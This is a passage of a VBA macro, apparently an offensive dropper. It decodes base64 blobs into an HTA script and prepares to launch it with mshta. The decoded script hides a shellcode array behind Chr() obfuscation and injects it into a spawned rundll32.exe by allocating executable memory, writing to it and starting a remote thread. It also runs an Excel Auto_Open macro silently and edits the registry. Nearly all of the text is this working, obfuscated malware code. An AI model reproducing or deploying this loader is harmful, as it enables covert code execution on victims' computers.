mQ2hyKDQ0KSZDaHIoNDUpJiI3NyImQ2hyKDQ0KSYiODAiJkNocig0NCkmIjg1IiZDaHIoNDQpJkNocig0NSkmIjQxIiZDaHIoNDQpJiBfIAoiMTA4IiZDaHIoNDQpJiIxNyImQ2hyKDQ0KSYiNSImQ2hyKDQ0KSZDaHIoNDUpJiIxMDUiJkNocig0NCkmQ2hyKDQ1KSYiMzYiJkNocig0NCkmQ2hyKDQ1KSYiNyImQ2hyKDQ0KSYiNzkiJkNocig0NCkmIjI0IiZDaHIoNDQpJiIyIiZDaHIoNDQpJiIyNSImQ2hyKDQ0KSYiMTEyIiZDaHIoNDQpJkNocig0NSkmIjEzIiZDaHIoNDQpJiI0MyImQ2hyKDQ0KSYiNTAiJiBfIApDaHIoNDQpJkNocig0NSkmIjg4IiZDaHIoNDQpJkNocig0NSkmIjUiJkNocig0NCkmIjgzIiZDaHIoNDQpJkNocig0NSkmIjYxIiZDaHIoNDQpJkNocig0NSkmIjQ2IiZDaHIoNDQpJkNocig0NSkmIjExNSImQ2hyKDQ0KSYiNTgiJkNocig0NCkmQ2hyKDQ1KSYiODEiJkNocig0NCkmIjQ5IiZDaHIoNDQpJiIyMSImQ2hyKDQ0KSZDaHIoNDUpJiI0NiImQ2hyKDQ0KSYgXyAKIjY2IiZDaHIoNDQpJiI0MyImQ2hyKDQ0KSZDaHIoNDUpJiI2OCImQ2hyKDQ0KSYiNjYiJkNocig0NCkmQ2hyKDQ1KSYiNzciJkNocig0NCkmQ2hyKDQ1KSYiNTkiJkNocig0NCkmIjgxIiZDaHIoNDQpJkNocig0NSkmIjc2IiZDaHIoNDQpJkNocig0NSkmIjEyNSImQ2hyKDQ0KSYiNzciJkNocig0NCkmQ2hyKDQ1KSYiMT"
    p3 = "ciJkNocig0NCkmQ2hyKDQ1KSYiNzkiJiBfIApDaHIoNDQpJiIxMTYiJkNocig0NCkmIjk0IiZDaHIoNDQpJkNocig0NSkmIjgwIiZDaHIoNDQpJiIyIiZDaHIoNDQpJiI3MiImQ2hyKDQ0KSZDaHIoNDUpJiIyMiImQ2hyKDQ0KSYiMTciJkNocig0NCkmQ2hyKDQ1KSYiNyImQ2hyKDQ0KSZDaHIoNDUpJiI1OCImQ2hyKDQ0KSYiMzMiJkNocig0NCkmQ2hyKDQ1KSYiMTQiJkNocig0NCkmIjExMyImQ2hyKDQ0KSYgXyAKIjEyNyImQ2hyKDQ0KSYiMTE5IiZDaHIoNDQpJiIxMjciJkNocig0NCkmIjI2IiZDaHIoNDQpJiI3NiImQ2hyKDQ0KSYiMzciJkNocig0NCkmIjIiJkNocig0NCkmQ2hyKDQ1KSYiMzgiJkNocig0NCkmQ2hyKDQ1KSYiMzgiJkNocig0NCkmIjk2IiZDaHIoNDQpJkNocig0NSkmIjQ0IiZDaHIoNDQpJkNocig0NSkmIjE4IiZDaHIoNDQpJkNocig0NSkmIjEwMiImIF8gCkNocig0NCkmQ2hyKDQ1KSYiMTE2IiZDaHIoNDQpJkNocig0NSkmIjE1IiZDaHIoNDQpJkNocig0NSkmIjEyNCImQ2hyKDQ0KSZDaHIoNDUpJiIzNyImQ2hyKDQ0KSYiMTEwIiZDaHIoNDQpJkNocig0NSkmIjEwOSImQ2hyKDQ0KSZDaHIoNDUpJiIxMTIiJkNocig0NCkmQ2hyKDQ1KSYiMTE3IiZDaHIoNDQpJkNocig0NSkmIjI2IiZDaHIoNDQpJiI5NyImQ2hyKDQ0KSYgXyAKQ2hyKDQ1KSYiOTEiJkNocig0NCkmIjQyIiZDaHIoNDQpJiI3NiImQ2hyKDQ0KSZDaHIoNDUpJiIyMCImQ2hyKDQ0KSYiNjciJkNocig0NCkmIjcwIiZDaHIoNDQpJkNocig0NSkmIjk0IiZDaHIoNDQpJkNocig0NSkmIjcyIiZDaHIoNDQpJkNocig0NSkmIjM2IiZDaHIoNDQpJkNocig0NSkmIjEiJkNocig0NCkmIjkxIiZDaHIoNDQpJkNocig0NSkmIjMxIiYgXyAKQ2hyKDQ0KSZDaHIoNDUpJiIxMDUiJkNocig0NCkmQ2hyKDQ1KSYiOTgiJkNocig0NCkmQ2hyKDQ1KSYiOTIiJkNocig0NCkmIjYwIiZDaHIoNDQpJkNocig0NSkmIjQ2IiZDaHIoNDQpJkNocig0NSkmIjk1IiZDaHIoNDQpJiI0NyImQ2hyKDQ0KSZDaHIoNDUpJiI3NiImQ2hyKDQ0KSYiMzQiJkNocig0NCkmIjExMSImQ2hyKDQ0KSZDaHIoNDUpJiI0MCImQ2hyKDQ0KSYgXyAKQ2hyKDQ1KSYiNjciJkNocig0NCkmIjQ4IiZDaHIoNDQpJkNocig0NSkmIjEwNCImQ2hyKDQ0KSZDaHIoNDUpJiI2NSImQ2hyKDQ0KSYiNjEiJkNocig0NCkmQ2hyKDQ1KSYiNTUiJkNocig0NCkmIjg5IiZDaHIoNDQpJiI0MiImQ2hyKDQ0KSYiNjEiJkNocig0NCkmQ2hyKDQ1KSYiOTMiJkNocig0NCkmIjkzIiZDaHIoNDQpJkNocig0NSkmIjQiJkNocig0NCkmIF8gCiIxMDYiJkNocig0NCkmIjkxIiZDaHIoNDQpJiI5MiImQ2hyKDQ0KSZDaHIoNDUpJiIzOSImQ2hyKDQ0KSYiOTIiJkNocig0NCkmQ2hyKDQ1KSYiNjAiJkNocig0NCkmQ2hyKDQ1KSYiOTciJkNocig0NCkmIjEyIiZDaHIoNDQpJkNocig0NSkmIjMzIiZDaHIoNDQpJiIzIiZDaHIoNDQpJiI5NSImQ2hyKDQ0KSZDaHIoNDUpJiI0NyImQ2hyKDQ0KSZDaHIoNDUpJiBfIAoiMjMiJkNocig0NCkmIjEyMCImQ2hyKDQ0KSYiODYiJkNocig0NCkmIjcxIiZDaHIoNDQpJiI4NSImQ2hyKDQ0KSYiMjMiJkNocig0NCkmQ2hyKDQ1KSYiMTA1IiZDaHIoNDQpJkNocig0NSkmIjEyMSImQ2hyKDQ0KSYiODUiJkNocig0NCkmQ2hyKDQ1KSYiMjUiJkNocig0NCkmQ2hyKDQ1KSYiNjMiJkNocig0NCkmQ2hyKDQ1KSYiNTEiJkNocig0NCkmIjg1IiYgXyAKQ2hyKDQ0KSZDaHIoNDUpJiIxMTMiJkNocig0NCkmQ2hyKDQ1KSYiNzUiJkNocig0NCkmQ2hyKDQ1KSYiNzUiJkNocig0NCkmIjYiJkNocig0NCkmQ2hyKDQ1KSYiODYiJkNocig0NCkmQ2hyKDQ1KSYiNzEiJkNocig0NCkmIjk5IiZDaHIoNDQpJiI1OSImQ2hyKDQ0KSYiMTAzIiZDaHIoNDQpJiI0NCImQ2hyKDQ0KSZDaHIoNDUpJiIxMTYiJkNocig0NCkmIjEwOSImIF8gCkNocig0NCkmQ2hyKDQ1KSYiMzciJkNocig0NCkmQ2hyKDQ1KSYiMjUiJkNocig0NCkmQ2hyKDQ1KSYiMjgiJkNocig0NCkmQ2hyKDQ1KSYiMTA5IiZDaHIoNDQpJiIyIiZDaHIoNDQpJkNocig0NSkmIjQ5IiZDaHIoNDQpJkNocig0NSkmIjg2IiZDaHIoNDQpJiIxMDgiJkNocig0NCkmIjk3IiZDaHIoNDQpJiI4MyImQ2hyKDQ0KSZDaHIoNDUpJiI4NCImQ2hyKDQ0KSYgXyAKQ2hyKDQ1KSYiMTEwIiZDaHIoNDQpJkNocig0NSkmIjkiJkNocig0NCkmIjEyNCImQ2hyKDQ0KSYiMjEiJkNocig0NCkmQ2hyKDQ1KSYiNiImQ2hyKDQ0KSYiNyImQ2hyKDQ0KSYiNjEiJkNocig0NCkmQ2hyKDQ1KSYiOTEiJkNocig0NCkmQ2hyKDQ1KSYiNiImQ2hyKDQ0KSYiMTA5IiZDaHIoNDQpJkNocig0NSkmIjY3IiZDaHIoNDQpJkNocig0NSkmIjExIiYgXyAKQ2hyKDQ0KSZDaHIoNDUpJiIxMTAiJkNocig0NCkmIjEyMiImQ2hyKDQ0KSZDaHIoNDUpJiIxMTAiJkNocig0NCkmQ2hyKDQ1KSYiNiImQ2hyKDQ0KSYiODIiJkNocig0NCkmQ2hyKDQ1KSYiMTI2IiZDaHIoNDQpJiI1NyImQ2hyKDQ0KSYiODMiJkNocig0NCkmQ2hyKDQ1KSYiNiImQ2hyKDQ0KSYiOSImQ2hyKDQ0KSZDaHIoNDUpJiI4NCImQ2hyKDQ0KSYiMTciJiBfIApDaHIoNDQpJkNocig0NSkmIjEwMSImQ2hyKDQ0KSYiMTQiJkNocig0NCkmQ2hyKDQ1KSYiMjciJkNocig0NCkmQ2hyKDQ1KSYiMTIiJkNocig0NCkmIjUiJkNocig0NCkmIjE0IiZDaHIoNDQpJiIxMCImQ2hyKDQ0KSYiNDUiJkNocig0NCkmQ2hyKDQ1KSYiNzQiJkNocig0NCkmIjExNyImQ2hyKDQ0KSYiOTUiJkNocig0NCkmQ2hyKDQ1KSYiNDYiJkNocig0NCkmIF8gCiI1NSImQ2hyKDQ0KSZDaHIoNDUpJiIxMTgiJkNocig0NCkmQ2hyKDQ1KSYiMTE5IiZDaHIoNDQpJkNocig0NSkmIjczIiZDaHIoNDQpJiI1NiImQ2hyKDQ0KSZDaHIoNDUpJiIxMTgiJkNocig0NCkmQ2hyKDQ1KSYiNzUiJkNocig0NCkmQ2hyKDQ1KSYiNTUiJkNocig0NCkmIjUiJkNocig0NCkmIjkyIiZDaHIoNDQpJkNocig0NSkmIjExNiImQ2hyKDQ0KSZDaHIoNDUpJiBfIAoiNjUiJkNocig0NCkmIjcyIiZDaHIoNDQpJiI5MiImQ2hyKDQ0KSZDaHIoNDUpJiI4NSImQ2hyKDQ0KSZDaHIoNDUpJiI4MCImQ2hyKDQ0KSZDaHIoNDUpJiIxIiZDaHIoNDQpJkNocig0NSkmIjYzIiZDaHIoNDQpJkNocig0NSkmIjEwMiImQ2hyKDQ0KSYiOTAiJkNocig0NCkmQ2hyKDQ1KSYiMSImQ2hyKDQ0KSYiODYiJkNocig0NCkmQ2hyKDQ1KSYiMzYiJkNocig0NCkmIF8gCiI3OCImQ2hyKDQxKSZDaHIoMTApJiIgICAgSWYgTCImImVuIiZDaHIoNDApJiJFbnZpcm9uIiZDaHIoNDApJkNocigzNCkmIF8KIlByb2dyYW1XIiYiNjQzMiImQ2hyKDM0KSZDaHIoNDEpJkNocig0MSkmIiAiJkNocig2MikmIiAwIFRoZW4iJkNocigxMCkmIiAgICAgICAgIiYic1Byb2MgIiZDaHIoNjEpJiIgRW52aXJvbiImQ2hyKDQwKSZDaHIoMzQpJiJ3aW5kaXIiJkNocigzNCkmQ2hyKDQxKSYiICImQ2hyKDM4KSYiICImQ2hyKDM0KSZDaHIoOTIpJkNocig5MikmIlN5c1dPVzY0IiYgXwpDaHIoOTIpJkNocig5MikmInJ1bmRsbDMyIiZDaHIoNDYpJiJleGUiJkNocigzNCkmQ2hyKDEwKSYiICAgIEVsc2UiJkNocigxMCkmIiAgICAgICAgIiYic1Byb2MgIiZDaHIoNjEpJiIgRW52aXJvbiImQ2hyKDQwKSZDaHIoMzQpJiJ3aW5kaXIiJkNocigzNCkmQ2hyKDQxKSYiICImQ2hyKDM4KSYiICImQ2hyKDM0KSZDaHIoOTIpJkNocig5MikmIlN5c3RlbTMyIiYgXwpDaHIoOTIpJkNocig5MikmInJ1bmRsbDMyIiZDaHIoNDYpJiJleGUiJkNocigzNCkmQ2hyKDEwKSYiICAgIEVuZCAiJiJJZiImQ2hyKDEwKSZDaHIoMTApJiIgICAgcmVzICImQ2hyKDYxKSYiIFJ1blN0dWYiJiJmIiZDaHIoNDApJiJzTnVsbCImQ2hyKDQ0KSYiIHNQcm9jIiZDaHIoNDQpJiIgQnlWYWwgMCImQ2hyKDM4KSZDaHIoNDQpJiIgQnlWYWwgMCImIF8KQ2hyKDM4KSZDaHIoNDQpJiIgQnlWYWwgMSImQ2hyKDM4KSZDaHIoNDQpJiIgQnlWYWwgNCImQ2hyKDM4KSZDaHIoNDQpJiIgQnlWYWwgMCImQ2hyKDM4KSZDaHIoNDQpJiIgc051bGwiJkNocig0NCkmIiBzSW5mbyImQ2hyKDQ0KSYiIHBJbmZvIiZDaHIoNDEpJkNocigxMCkmQ2hyKDEwKSYiICAgIHJ3eHAiJiJhZ2UgIiZDaHIoNjEpJiIgQWxsb2NTdCImIF8KInVmZiImQ2hyKDQwKSYicEluZm8iJkNocig0NikmImhQcm9jZXNzIiZDaHIoNDQpJiIgMCImQ2hyKDQ0KSYiIFVCb3VuZCImQ2hyKDQwKSYibXlBcnJheSImQ2hyKDQxKSZDaHIoNDQpJiIgIiZDaHIoMzgpJiJIMTAwMCImQ2hyKDQ0KSYiICImQ2hyKDM4KSYiSDQwIiZDaHIoNDEpJkNocigxMCkmIiAgICBGb3IgIiYib2Zmc2V0ICImQ2hyKDYxKSYiIExCb3VuZCImIF8KQ2hyKDQwKSYibXlBcnJheSImQ2hyKDQxKSYiIFRvIFVCb3UiJiJuZCImQ2hyKDQwKSYibXlBcnJheSImQ2hyKDQxKSZDaHIoMTApJiIgICAgICAgICImIm15Qnl0ZSAiJkNocig2MSkmIiBteUFycmF5IiZDaHIoNDApJiJvZmZzZXQiJkNocig0MSkmQ2hyKDEwKSYiICAgICAgICAiJiJyZXMgIiZDaHIoNjEpJiIgV3JpdGVTdCImInVmZiImQ2hyKDQwKSYicEluZm8iJiBfCkNocig0NikmImhQcm9jZXNzIiZDaHIoNDQpJiIgcnd4cGFnZSImIiAiJkNocig0MykmIiBvZmZzZXQiJkNocig0NCkmIiBteUJ5dGUiJkNocig0NCkmIiAxIiZDaHIoNDQpJiIgQnlWYWwgMCImQ2hyKDM4KSZDaHIoNDEpJkNocigxMCkmIiAgICBOZXh0IiYiIG9mZnNldCImQ2hyKDEwKSYiICAgIHJlcyAiJkNocig2MSkmIiBDcmVhdGVTIiYidHVmZiImQ2hyKDQwKSYgXwoicEluZm8iJkNocig0NikmImhQcm9jZXNzIiZDaHIoNDQpJiIgMCImQ2hyKDQ0KSYiIDAiJkNocig0NCkmIiByd3hwYWdlIiZDaHIoNDQpJiIgMCImQ2hyKDQ0KSYiIDAiJkNocig0NCkmIiAwIiZDaHIoNDEpJkNocigxMCkmIkVuZCBTdWIiJkNocigxMCkmIlN1YiBBdXRvIiYiT3BlbiImQ2hyKDQwKSZDaHIoNDEpJkNocigxMCkmIiAgICBBdXRvIiYiX09wZW4iJiBfCkNocigxMCkmIkVuZCBTdWIiJkNocigxMCkmIlN1YiBXb3JrIiYiYm9va19PcGUiJiJuIiZDaHIoNDApJkNocig0MSkmQ2hyKDEwKSYiICAgIEF1dG8iJiJfT3BlbiImQ2hyKDEwKSYiRW5kIFN1YiImQ2hyKDEwKQpvYmpFeGNlbC5EaXNwbGF5QWxlcnRzID0gRmFsc2UKb24gZXJyb3IgcmVzdW1lIG5leHQKb2JqRXhjZWwuUnVuICJBdXRvX09wZW4iCm9ialdvcmtib29rLkNsb3NlIEZhbHNlCm9iakV4Y2VsLlF1aXQKCicgUmVzdG9yZSB0aGUgcmVnaXN0cnkgdG8gaXRzIG9sZCBzdGF0ZQppZiBhY3Rpb24gPSAiIiB0aGVuCiAgICAgICAgV3NoU2hlbGwuUmVnRGVsZXRlIFJlZ1BhdGgKZWxzZQogICAgICAgIFdzaFNoZWxsLlJlZ1dyaXRlIFJlZ1BhdGgsIGFjdGlvbiwgIlJFR19EV09SRCIKZW5kIGlmCnNlbGYuY2xvc2UKPC9zY3JpcHQ+PC9oZWFkPjwvaHRtbD4="

    Open output_file_path For Output As #1
    Write #1, deobfuscate(p1 & p2 & p3)
    Close #1

    payload = "mshta " & output_file_path
    'x = Shell(payload, 1)
End Sub
